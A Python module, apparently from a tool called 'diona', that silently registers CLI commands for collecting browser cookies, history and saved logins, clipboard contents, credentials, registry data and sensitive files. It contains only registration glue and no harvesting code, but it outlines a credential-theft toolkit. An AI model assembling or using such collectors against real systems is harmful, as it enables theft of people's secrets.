"""Register all commands from sensitive modules"""

def register_sensitive_commands():
    """Register all sensitive module commands"""
    from diona.project.cli.commands import get_command_registry
    
    registry = get_command_registry()
    
    sensitive_commands = []
    
    try:
        from diona.system.sensitive.browser.cookies.command import CookieCollectorCommand
        sensitive_commands.append(CookieCollectorCommand)
    except Exception:
        pass
    
    try:
        from diona.system.sensitive.browser.history.command import HistoryCollectorCommand
        sensitive_commands.append(HistoryCollectorCommand)
    except Exception:
        pass
    
    try:
        from diona.system.sensitive.browser.logindata.command import LoginDataCollectorCommand
        sensitive_commands.append(LoginDataCollectorCommand)
    except Exception:
        pass
    
    try:
        from diona.system.sensitive.clipboard.command import ClipboardCommand
        sensitive_commands.append(ClipboardCommand)
    except Exception:
        pass
    
    try:
        from diona.system.sensitive.credential.command import CredentialCollectorCommand
        sensitive_commands.append(CredentialCollectorCommand)
    except Exception:
        pass
    
    try:
        from diona.system.sensitive.info.command import SystemInfoCommand
        sensitive_commands.append(SystemInfoCommand)
    except Exception:
        pass
    
    try:
        from diona.system.sensitive.regedit.command import RegistryCommand
        sensitive_commands.append(RegistryCommand)
    except Exception:
        pass
    
    try:
        from diona.system.sensitive.runcontext.command import RunContextCommand
        sensitive_commands.append(RunContextCommand)
    except Exception:
        pass
    
    try:
        from diona.system.sensitive.search.command import SearchCommand
        sensitive_commands.append(SearchCommand)
    except Exception:
        pass
    
    try:
        from diona.system.sensitive.sensitivefile.command import SensitiveFileCommand
        sensitive_commands.append(SensitiveFileCommand)
    except Exception:
        pass
    
    for cmd in sensitive_commands:
        registry.register_model(cmd)


register_sensitive_commands()
